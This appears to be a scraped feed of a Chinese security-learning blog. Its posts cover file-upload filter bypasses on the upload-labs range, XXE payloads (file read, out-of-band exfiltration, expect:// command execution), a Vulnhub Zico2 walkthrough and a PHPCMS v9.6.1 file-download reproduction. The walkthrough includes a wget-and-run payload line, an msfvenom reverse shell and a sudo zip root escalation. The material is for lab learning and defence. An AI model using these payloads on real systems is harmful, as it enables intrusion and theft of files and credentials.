1234&gt; test.asa&gt; test.cer&gt; test.cdx&gt; IIS PUT漏洞 PUT是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。 在IIS中，若目录具有写权限且Webdav是开启的，就会支持PUT方法。 0x01 Apache解析漏洞Apache 1.x、2.x： Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。 Apache可识别的文件后缀（类型）定义在mime.types文件中。 例如文件名：shell.php.rar.rar.rar，Apache由于无法识别.rar，会从后往前一直寻找可识别的文件类型，最后会将其作为.php文件。 0x02 Nginx解析漏洞1.漏洞外在表现： 访问：http://xx.com/x.jpg/y.php，x.jpg会被作为php文件执行。注意y.php是实际不存在的。 2.漏洞原理： 严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。 在nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问http://xx.com/shell.jpg/test.php这个URL时，$fastcgi_script_name会被设置为shell.jpg/test.php，然后将构造好的SCRIPT_FILENAME传递给cgi Server。 当php开启cgi.fix_pathinfo这个选项时（默认开启），那么就会触发在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是shell.jpg，而test.php是PATH_INFO，所以就会将shell.jpg作为PHP文件来解析了。 因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。 3.漏洞修复： 修改php.ini文件，将cgi.fix_pathinfo的值设置为0; 三、文件上传过滤与绕过 结合upload-labs文件上传漏洞靶场进行分析学习。 靶场地址：https://github.com/c0ny1/upload-labs 0x00 前端过滤与绕过（Pass-01）过滤: 前端使用JS对上传的文件后缀进行限制。 绕过: 禁用浏览器Javascript。 或者使用Burpsuite抓包修改文件名的方式。 0x01 后端过滤与绕过1.Mime类型过滤：Content-Type （Pass-02） 过滤代码：只允许上传特定mime类型的文件。 Mime类型过滤绕过： 抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。 2.黑名单过滤之过滤不全 (Pass-03) 过滤代码： 绕过方式： 被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：.php3、.php4、.phtml等后缀。 3.黑名单过滤之未过滤.htaccess （Pass-04） 过滤代码： 绕过方式： 可以发现大部分文件后缀被过滤，但.htaccess未被过滤时，可以上传一个.htaccess文件，文件内容： SetHandler application/x-httpd-php 上传这样的.htaccess文件后，所有文件都会被解析为php，然后再上传图片马，图片会被解析为php文件执行，就可以绕过过滤实现攻击。 DOS下图片马制作： copy /b a.png + /a b.php c.png /b表示a.png是二进制文件，以二进制方式合并文件。 /a表示b.php是ASCII文件。（该参数可以省略） c.png是合并后得到的文件。 上传图片马并访问： PS:.htacess该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。.htaccess文件(或者”分布式配置文件”），提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。 4.黑名单过滤之未统一大小写 （Pass-05） 过滤代码：strtolower()字符串函数会将字符串的所有字符变为小写。 绕过方式： 由于未统一大小写，导致过滤不全，可尝试.PhP、.pHP等后缀的方式绕过。 5.黑名单过滤之未去除空白 （Pass-06） 过滤代码：trim()字符串函数会将字符串首尾的空白去除。 绕过方式： 在文件后缀前或者后面加入空白。 6.黑名单过滤之未去除”.” （Pass-07） 过滤代码： 绕过方式： 利用windows特性，会自动去掉后缀名中最后的.，可在后缀名中加.绕过。 抓包修改文件名，在文件名最后加入.。 6.黑名单过滤之未去除”::$DATA” （Pass-08） 过滤代码： 绕过方式：php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。目的就是不检查后缀名。 即在文件名之后加::$DATA绕过。 7.黑名单过滤之文件名拼接 （Pass-09） 过滤代码： 绕过方式： 抓包修改文件名为：xxxx.php. .(点 空格 点) 8.黑名单过滤之替换后缀名 (Pass-10) 过滤代码：str_ireplace(find,replace,string,count)函数替换字符串中的一些字符（不区分大小写）。 绕过方式： 使用双写后缀的方式绕过，如使用shell.pphphp，中间的php字符被替换为空后，得到shell.php。 9.白名单过滤之路径拼接GET (Pass-11) 过滤代码： 绕过方式： 使用%00截断，%00是URL编码后的空字符，即ASCII码为0的字符（空字符），十六进制表示为0x00，转义字符为\\0，在C、PHP等语言中空字符表示字符串的结束。 截断条件： php版本小于5.3.4 详情关注CVE-2006-7243 php的magic_quotes_gpc为OFF状态 //如果不修改将无法上传成功，默认为ON %00截断参考链接：https://www.2cto.com/article/201502/377462.html 10.白名单过滤之路径拼接POST （Pass-12） 过滤代码： 绕过方式： 同样使用%00截断绕过，但是与GET方式不同的是，由于GET提交的数据是在URL中的，因此服务器会对其进行URL decode。而POST提交的是不会进行URL解码的，因此需要在十六进进制中添加0x00。 11.文件内容过滤之内容匹配 (Pass-13) 过滤代码： 绕过方式： 使用图片马即可，图片马制作见Pass-04。 12.文件内容过滤之文件类型 (Pass-14、Pass-15) 过滤代码： getimagesize (string $filename)返回一个具有四个单元的数组。索引0包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF… exif_imagetype()读取一个图像的第一个字节并检查其签名。 绕过方式： 使用图片马进行绕过。 13.文件内容过滤之二次渲染 (Pass-16) 过滤代码： imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。 绕过方式： 绕过方法是将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写脚本程序。 二次渲染与绕过方法参考连接：https://secgeek.net/bookfresh-vulnerability/ 14.条件竞争 （Pass-17） 过滤代码：unlink()函数作用是删除文件。若成功，则返回 true，失败则返回 false。 绕过方式： 这里注意一个点，不管什么文件都是会被上传到服务器上的，上传到服务器之后才进行白名单检查。 因此，绕过的思路就是在文件被安全检查删除之前访问文件。 多个进程并发访问和操作同一数据且执行结果与访问的特定顺序有关，称为竞争条件。 攻击方法：上传一个php文件，使用Burpsuite进行抓包并将数据包发送到intruder模块，清空变量，然后选择Payload的类型为Null payloads，并输入重放数据包的数量，保证不断在上传文件。同时使用浏览器不断刷新访问上传的php文件，直到访问成功。 参考连接： https://xz.aliyun.com/t/2435 https://github.com/LandGrey/upload-labs-writeup http://www.cnblogs.com/shellr00t/p/6426856.html https://www.anquanke.com/post/id/164561","categories":[{"name":"WEB漏洞学习","slug":"WEB漏洞学习","permalink":"https://sakuxa.com/categories/WEB漏洞学习/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://sakuxa.com/tags/靶场/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sakuxa.com/tags/文件上传/"},{"name":"过滤与绕过","slug":"过滤与绕过","permalink":"https://sakuxa.com/tags/过滤与绕过/"}]},{"title":"XXE（XML External Entity）漏洞","slug":"XXE","date":"2019-03-01T00:59:43.000Z","updated":"2019-05-21T03:47:02.895Z","comments":true,"path":"2019/03/01/XXE/","link":"","permalink":"https://sakuxa.com/2019/03/01/XXE/","excerpt":"XXE -“xml external entity injection”即”xml外部实体注入漏洞”。","text":"XXE -“xml external entity injection”即”xml外部实体注入漏洞”。 0x00 必备XML基础知识DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。 更多XML基础知识跳转这里。 0x01 XXE漏洞概述攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。 在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 漏洞检测： 首先，检测XML是否会被解析。&amp;xxe;是否会被解析为”this is xxe”.(注意：GET请求时记得把&amp;进行URL编码) Payload:&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;this is xxe..&quot;&gt; ]&gt; &lt;x&gt;&amp;xxe;&lt;/x&gt; 然后，检测服务器是否支持外部实体。执行Payload后查看test.com服务器的http访问日志，看是否存在GET /xxe_test HTTP/1.0的请求，若存在则证明支持外部实体。 Payload:&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://test.com/xxe_test&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; XXE Payload Cheatsheet: https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection 0x02 恶意引入外部实体情景一： 12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT note any&gt; &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;note&gt; &amp;xxe; &lt;/note&gt; 情景二： 123456789&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT note any&gt; &lt;!ENTITY % hack SYSTEM \"hack.dtd\" &gt; % hack //会被hack.dtd的内容替换。]&gt;&lt;note&gt; &amp;xxe; &lt;/note&gt; hack.dtd文件内容： 1&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; 情景三： 1234&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note SYSTEM \"hack.dtd\"&gt;&lt;note&gt; &amp;xxe; &lt;/note&gt; hack.dtd文件内容： 1&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; 外部引用实体时，不同的程序可以使用的协议不一样： 0x03 XXE漏洞利用利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。 一般XXE利用分为两大场景：有回显和无回显。 有回显的情况可以直接在页面中看到Payload的执行结果或现象。 无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。 基本漏洞源码： 1234&lt;?php $xml=simplexml_load_string($_REQUEST['xml']); echo \"&lt;p&gt;$xml&lt;/p&gt;\"?&gt; 1.任意文件读取： 有回显的情况： Payload:&lt;!DOCTYPE note [&lt;!ELEMENT note ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///S://aa.txt&quot;&gt;]&gt;&lt;note&gt;&amp;xxe;&lt;/note&gt; 无回显的情况： %file;会调用php插件对要读取的文件内容进行Base64编码。 %dtd;会请求我们编写好的evil.xml文件，会被evil.xml文件内容替换。 %payload;被&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;替换。 %send;会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看http的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。 Payload: 12345&lt;!DOCTYPE note [ &lt;!ELEMENT note ANY &gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/S:/test.txt&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt; %dtd; %payload; %send; ]&gt; evil.xml文件内容：内部send的%要用实体：&amp;#x25; 1&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost/?content=%file;&apos;&gt;&quot;&gt; http访问日志：（到配置文件http.conf里找到CustomLog &quot;logs/access.log&quot; common并删除掉#号注释） PS:之所以要引入文件evil.xml原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。 Base64解码： 2.命令执行： 安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。 expect封装协议默认未开启。 Payload:&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://whoami&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 3.内网端口探测： Payload:&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://localhost:81&quot;&gt; ]&gt;&lt;x&gt;%26xxe;&lt;/x&gt; 0x04 漏洞防御 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。 在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。 使用开发语言提供的禁用外部实体的方法。 参考链接： https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md https://www.cnblogs.com/backlion/p/9302528.html https://www.jianshu.com/p/77f2181587a4","categories":[{"name":"WEB漏洞学习","slug":"WEB漏洞学习","permalink":"https://sakuxa.com/categories/WEB漏洞学习/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://sakuxa.com/tags/XXE/"},{"name":"XML注入","slug":"XML注入","permalink":"https://sakuxa.com/tags/XML注入/"},{"name":"OWASP Top10 2017","slug":"OWASP-Top10-2017","permalink":"https://sakuxa.com/tags/OWASP-Top10-2017/"}]},{"title":"XML基本知识学习","slug":"xml","date":"2019-02-28T07:10:47.000Z","updated":"2019-05-21T04:06:13.157Z","comments":true,"path":"2019/02/28/xml/","link":"","permalink":"https://sakuxa.com/2019/02/28/xml/","excerpt":"XML 指可扩展标记语言（eXtensible Markup Language）。","text":"XML 指可扩展标记语言（eXtensible Markup Language）。 0x00 XML概述 XML 的设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义。 XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。 XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。 XML与HTML 1.XML 和 HTML 为不同的目的而设计： XML 被设计用来传输和存储数据。 HTML 被设计用来显示数据。 2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。 3.XML 是独立于软件和硬件的信息传输工具。 0x01 XML结构 XML文档是树形结构的，由根元素扩展，且必须包含根元素。 一个栗子: 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;note date=\"9102/2/28\"&gt; &lt;to&gt;Mikasa&lt;/to&gt; &lt;from&gt;Allen&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;&lt;/note&gt; 第一行是XML声明，指定XML版本以及编码方式，声明是可选的。 &lt;note&gt;为根元素，XML标签都是成对且闭合的，以&lt;/note&gt;闭合标签。 XML是大小写敏感的，&lt;note&gt;与&lt;Note&gt;是不同的标签。 标签是可以设置属性的，如例子中&lt;note&gt;标签的date，但是属性的值必须使用引号括起来。 实体引用： 在 XML 中，一些字符拥有特殊的意义。 例如，如果把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。 12&lt;!-- 使用下面会发生错误 --&gt;&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt; 为了避免这个错误，用实体引用来代替 “&lt;” 字符： 1&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; XML有5个预定义的实体引用： 0x02 DTD文档类型定义（DTD）可定义合法的XML文档构建模块。 1.为什么使用DTD？ 通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。 通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。 还可以用DTD 来验证从外部接收到的、自身的数据。 2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 i.在文档内声明的栗子：&lt;!DOCTYPE root-element [element-declarations]&gt; 1234567891011121314&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [ #定义此文档是 note 类型的文档。 &lt;!ELEMENT note (to,from,heading,body)&gt; #定义note元素有四个元素：\"to、from、heading、body\" &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; #定义body元素为\"#PCDATA\"类型]&gt;&lt;note&gt; &lt;to&gt;Mikasa&lt;/to&gt; &lt;from&gt;Allen&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget me this weekend&lt;/body&gt;&lt;/note&gt; ii.作为外部引用的例子：&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt; 12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt; #引用外部文件note.dtd&lt;note&gt; &lt;to&gt;Mikasa&lt;/to&gt; &lt;from&gt;Allen&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;&lt;/note&gt; note.dtd文件内容： 12345&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; 3.DTD实体 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。 实体引用是对实体的引用。引用后会获得实体指向的实际数据。 实体声明也是在DTD声明中，与元素声明同级。 i.在文档内部声明实体的例子：&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT note ANY&gt; #定义note元素可以有任意元素。 &lt;!ENTITY entity1 \"Be\"&gt; #文档内声明 &lt;!ENTITY entity2 \"back.\"&gt;]&gt;&lt;note&gt;&amp;entity1; &amp;entity2;&lt;/note&gt; ii.外部声明引用实体的例子：&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; or &lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt; 1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT note ANY&gt; &lt;!ENTITY entity1 SYSTEM \"http://www.sakuxa.com/example.xml\"&gt; #system关键字表示外部引用]&gt;&lt;note&gt; &amp;entity1;&lt;/note&gt; iii.参数实体 参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。 记住：%entity; 会被它指向的数据进行直接替换。 12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT note ANY&gt; &lt;!ENTITY % entity1 SYSTEM \"http://www.sakuxa.com/example.dtd\"&gt; %entity1 #会被example.dtd内容替换]&gt;&lt;note&gt; &amp;entity2;&lt;/note&gt; example.dtd文件内容： 1&lt;!ENTITY entity2 &quot;Be back.&quot;&gt; 注意： 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。","categories":[{"name":"语言","slug":"语言","permalink":"https://sakuxa.com/categories/语言/"}],"tags":[{"name":"XML","slug":"XML","permalink":"https://sakuxa.com/tags/XML/"},{"name":"Language","slug":"Language","permalink":"https://sakuxa.com/tags/Language/"}]},{"title":"文件与目录权限","slug":"文件与目录权限","date":"2019-02-28T00:58:56.000Z","updated":"2019-05-21T04:09:01.966Z","comments":true,"path":"2019/02/28/文件与目录权限/","link":"","permalink":"https://sakuxa.com/2019/02/28/文件与目录权限/","excerpt":"对Windows和Linux的文件及目录权限进行整理总结。","text":"对Windows和Linux的文件及目录权限进行整理总结。 0x00 Windows文件与文件夹权限 权限 对于文件夹 对于文件 读取 允许查看并列出文件和子文件夹（Viewing、Listing） 允许查看和访问文件内容（Viewing、Accessing） 写入 允许添加文件和子文件夹(Adding) 允许写入一个文件(Writing) 读取和执行 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承 允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting） 列出文件夹内容 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承 N / A 修改 允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete) 允许读取和写入文件(Reading、Writing); 允许删除文件（Delete） 完全控制 允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting) 允许读取，写入，更改和删除文件(Reading、Writing、Deleting) 读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。 Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。 Linux通过”x”权限属性标识是否可执行。 脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。 授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。 如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。 Windows文件或文件夹权限查看 右键文件或文件夹 ——&gt; 属性 ——&gt; 安全。 参考链接： https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10) 0x01 Linux文件及目录权限Linux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西： 文件：文件内容是文件存储的data。 目录：文件内容是目录下的文件名。 对象 文件内容 r w x 文件 文件内的数据 可读取文件内容 修改文件内容（编辑、增、改、不能删除文件） 执行文件 目录 目录下的文件名 可读取看到目录下的文件名 可异动目录结构 可进入目录的权限 权限对于目录： r 读取文件结构的权限，即可以获得目录下的文件名清单。可执行ls命令。 w 创建文件或目录。（touch、mkdir） 删除文件或目录。（不论文件的权限如何）(rm、rmdir) 重命名文件或目录。（cp） 移动文件或目录。(mv) x 能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否cd进去。 例子： 要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。 因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有”rx”权限。具体权限配置可参考连接：https://www.cnblogs.com/sochishun/p/7413572.html 改变文件权限：","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"文件权限","slug":"文件权限","permalink":"https://sakuxa.com/tags/文件权限/"}]},{"title":"Vulnhub靶机渗透笔记——Zico2","slug":"hack-zico","date":"2019-02-26T02:30:34.000Z","updated":"2019-05-21T04:12:18.436Z","comments":true,"path":"2019/02/26/hack-zico/","link":"","permalink":"https://sakuxa.com/2019/02/26/hack-zico/","excerpt":"靶机：Zico2 攻击机：Kali Linux VirtualBox 网络连接方式：host-only、DHCP 目标：boot2root获取flag。","text":"靶机：Zico2 攻击机：Kali Linux VirtualBox 网络连接方式：host-only、DHCP 目标：boot2root获取flag。 0x00 信息收集与漏洞挖掘1.主机发现：nmap -sn 192.168.110.0/24 靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。 2.端口探测：nmap -Pn -sV -n -T4 -p- 192.168.110.3 端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。 还确定了靶机系统为Ubuntu Linux、Web容器为Apache。 3.Web服务 服务探测：whatweb http://192.168.110.3 -a 3 目录爆破：dirb http://192.168.110.3 爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。 访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。 进入数据库管理页面后可获得以下信息： 数据库路径：/usr/databases/ 数据库名：test_users 数据表：info 查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到somd5网站解密，得到结果： root 34kroot34 zico zico2215@ 将得到的两个用户名密码尝试进行SSH登录，结果失败。 漏洞扫描 使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：http://192.168.110.3/view.php?page=tools.html 验证漏洞，尝试包含/etc/passwd文件，发现成功包含。 0x01 Getshellsqlite属于单文件数据库，类似Access数据库。 1.思路一 尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建../../var/www/html/shell.php，/会被过滤，该方法不可行。 2.思路二：文件包含Getshell 先尝试通过日志文件/var/log/apache2/access.log，先访问http://192.168.110.3/&lt;?php phpinfo();?&gt;，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。 包含数据库文件Getshell 首先通过phpLiteAdmin向info表插入一条数据：&lt;?php system(&quot;cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell&quot;);?&gt;，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。 然后在攻击机上使用msfvenon生成shell文件：msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf &gt; shell 在shell文件所在的路径建立一个简单HTTP服务器：python -m SimpleHTTPServer 80 设置msf监听，use exploit/multi/hander、set payload linux/x86/meterpreter/reverse_tcp、set lhost 192.168.110.4。 访问连接http://192.168.110.3/view.php?page=../../usr/databases/test_users，然后会得到一个meterpreter会话。 0x02 权限提升获得靶机shell后查看用户，发现不是root，需要提权。 首先查看/etc/passwd文件，找出id大于1000的用户，发现值得关注的用户有root、zico。 查找属主为zico的文件：find / -user zico 2&gt; /dev/null，执行后结果过多。直接cd /home/zico到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：sWfCsfJSPV9H3AmQzw8。 尝试使用该用户名密码登录SSH：ssh zico@sWfCsfJSPV9H3AmQzw8。成功登录。 使用sudo -l命令查看zico用户可以执行的root命令。发现可以执行/bin/tar、/usr/bin/zip。 执行touch /tmp/exploit、sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;bash -c /bin/sh&quot; 成功提权至root。 获取flag，进入root用户家目录，flag在目录下的flag.txt文件。 另一种提权方式 获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。 到Exploit-DB搜索内核提权漏洞，并下载Exp到靶机编译执行。 0x03 总结 文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。 Python2搭建简单HTTP服务器来传文件：python -m SimpleHTTPServer 80 上传/执行文件遇权限问题时，可传到/tmp目录。 参考连接 https://www.colabug.com/1925534.html","categories":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://sakuxa.com/categories/Vulnhub/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"https://sakuxa.com/tags/文件包含/"},{"name":"Getshell","slug":"Getshell","permalink":"https://sakuxa.com/tags/Getshell/"},{"name":"权限提升","slug":"权限提升","permalink":"https://sakuxa.com/tags/权限提升/"},{"name":"靶机","slug":"靶机","permalink":"https://sakuxa.com/tags/靶机/"}]},{"title":"PHPCMSv9.6.1任意文件下载漏洞复现","slug":"phpcms9-6-1","date":"2019-02-25T12:32:30.000Z","updated":"2019-05-21T10:50:45.779Z","comments":true,"path":"2019/02/25/phpcms9-6-1/","link":"","permalink":"https://sakuxa.com/2019/02/25/phpcms9-6-1/","excerpt":"某客户网站被通报任意文件下载漏洞，被要求进行查证，经过信息收集发现是PHPCMS V9，对该漏洞做个复现记录。","text":"某客户网站被通报任意文件下载漏洞，被要求进行查证，经过信息收集发现是PHPCMS V9，对该漏洞做个复现记录。 0x00 环境介绍 系统：Windows 10 Phpstudy 2018 CMS：PHPCMS v9.6.1 PHPCMS v9各版本下载地址：http://download.phpcms.cn/v9/9.6/ 0x01 安装PHPCMS v9首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。 启动phpstudy，访问http://localhost/install_package/install/install.php进入安装界面。 依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。 0x02 漏洞利用1.获取Cookie：xxx_siteid 首先访问http://localhost/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1并获取Cookie。 2.获取Cookie：xxx_att_json 访问http://localhost/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。 要点： src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是/phpcms/modules/content/down.php。 3.获取下载链接 访问http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=，并将上一步得到的xxx_att_json的值作为a_k参数的值。 http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g 访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。 0x03 遇到的问题得到下载连接访问页面，点击下载会报参数错误。 解决办法： https://blog.csdn.net/vindraz/article/details/12579211 